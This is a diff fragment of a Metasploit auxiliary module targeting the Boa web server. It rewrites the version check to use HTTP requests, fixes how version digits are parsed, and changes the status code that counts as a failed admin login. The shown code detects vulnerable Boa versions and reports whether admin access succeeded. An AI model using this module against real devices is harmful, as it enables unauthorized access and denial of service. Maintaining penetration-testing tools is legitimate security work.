@@ -14,7 +14,6 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
@@ -50,14 +49,14 @@ class Metasploit3 < Msf::Auxiliary
   
   def check
     begin
-      connect
-      sock.put('GET / HTTP/1.0\r\n\r\n')
-      resp = sock.get_once
-      disconnect
-      if (resp and (m = resp.match(/Server: Boa\/(.*)/)))
+      res = send_request_cgi({
+                               'uri'=>'/',
+                               'method'=>'GET'
+                             })
+      if (res and (m = res.headers['Server'].match(/Boa\/(.*)/)))
         print_status("Boa Version Detected: #{m[1]}")
-        return Exploit::CheckCode::Safe if (m[1][0]>0) # boa server wrong version
-        return Exploit::CheckCode::Safe if (m[1][3]>4)
+        return Exploit::CheckCode::Safe if (m[1][0].ord-48>0) # boa server wrong version
+        return Exploit::CheckCode::Safe if (m[1][3].ord-48>4)
         return Exploit::CheckCode::Vulnerable
       else
         print_status("Not a Boa Server!")
@@ -85,7 +84,7 @@ class Metasploit3 < Msf::Auxiliary
                                })
         if (res.code == 200)
           print_status("Access successful with admin:#{datastore['PASSWORD']}")
-        elsif (res.code != 403)
+        elsif (res.code != 401)
           print_status("Access not forbidden, but another error has occured: Code #{res.code} encountered")
         else
           print_status("Access forbidden, this module has failed.")
